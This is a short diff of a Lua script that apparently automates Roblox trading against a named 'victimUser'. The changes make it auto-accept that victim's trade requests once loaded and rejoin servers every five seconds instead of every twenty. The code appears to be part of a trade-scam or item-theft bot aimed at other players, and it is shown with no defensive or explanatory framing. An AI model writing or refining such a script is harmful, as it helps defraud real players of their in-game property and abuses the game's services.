@@ -35,10 +35,15 @@ local TradeAcceptOrDeclineRequest = RouterClient.get("TradeAPI/AcceptOrDeclineTr
 local TradeRequestReceivedRemote = RouterClient.get_event("TradeAPI/TradeRequestReceived")
 
 local pendingTradeSender = nil
+local isFullyLoaded = false
 
 TradeRequestReceivedRemote.OnClientEvent:Connect(function(sender, ...)
     if sender.Name == victimUser then
-        pendingTradeSender = sender
+        if not isFullyLoaded then
+            pendingTradeSender = sender
+        else
+            TradeAcceptOrDeclineRequest:InvokeServer(sender, true)
+        end
     end
 end)
 
@@ -59,6 +64,7 @@ if IS_ADM then
 end
 
 nouse = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
+isFullyLoaded = true
 
 if pendingTradeSender then
     TradeAcceptOrDeclineRequest:InvokeServer(pendingTradeSender, true)
@@ -192,6 +198,6 @@ local function autoJoin()
     end
 end
 
-while wait(20) do
+while wait(5) do
     autoJoin()
 end
